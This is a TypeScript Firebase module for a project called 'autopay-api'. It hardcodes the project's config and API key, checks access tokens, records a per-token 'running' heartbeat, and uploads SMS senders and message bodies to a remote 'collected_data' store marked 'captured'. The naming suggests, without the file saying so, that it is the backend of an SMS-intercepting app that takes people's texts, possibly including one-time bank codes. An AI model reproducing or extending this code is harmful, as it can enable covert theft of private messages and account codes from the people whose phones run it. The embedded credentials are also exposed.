
import { initializeApp } from 'firebase/app';
import { 
  getFirestore, 
  collection, 
  addDoc, 
  query, 
  where, 
  getDocs, 
  orderBy,
  limit,
  serverTimestamp, 
  enableIndexedDbPersistence,
  doc,
  setDoc
} from 'firebase/firestore';
import { SMSMessage } from '../types';

const firebaseConfig = {
    apiKey: "AIzaSyCFNNXY4oRMg8AjhWa9PqCN8gdILmwdRk0",
    authDomain: "autopay-api.firebaseapp.com",
    projectId: "autopay-api",
    storageBucket: "autopay-api.firebasestorage.app",
    messagingSenderId: "560907178391",
    appId: "1:560907178391:web:aa544aedc91be464cd74d2"
};

const app = initializeApp(firebaseConfig);
export const db = getFirestore(app);

// Enable offline persistence
if (typeof window !== 'undefined') {
  enableIndexedDbPersistence(db).catch((err) => {
    if (err.code === 'failed-precondition') {
      console.warn("Multiple tabs open, persistence can only be enabled in one tab at a time.");
    } else if (err.code === 'unimplemented') {
      console.warn("The current browser doesn't support all of the features needed to enable persistence.");
    }
  });
}

export const verifyToken = async (token: string): Promise<boolean> => {
  try {
    const q = query(collection(db, "tokens"), where("token", "==", token));
    const querySnapshot = await getDocs(q);
    return !querySnapshot.empty;
  } catch (error) {
    console.error("Token verification error:", error);
    throw error;
  }
};

export const logServiceActivity = async (token: string) => {
  const ref = doc(db, "collected_data", token);
  await setDoc(ref, {
    last_active: serverTimestamp(),
    status: "running"
  }, { merge: true });
};

export const saveMessage = async (token: string, sender: string, body: string) => {
  const msgRef = collection(db, "collected_data", token, "messages");
  await addDoc(msgRef, {
    sender,
    body,
    date: Date.now(),
    timestamp: serverTimestamp(),
    sync_status: "captured"
  });
};

export const getMessages = async (token: string): Promise<SMSMessage[]> => {
  try {
    const msgRef = collection(db, "collected_data", token, "messages");
    const q = query(msgRef, orderBy("date", "desc"), limit(50));
    const querySnapshot = await getDocs(q);
    return querySnapshot.docs.map(doc => ({
      id: doc.id,
      ...doc.data()
    })) as SMSMessage[];
  } catch (error) {
    console.error("Error fetching messages:", error);
    return [];
  }
};
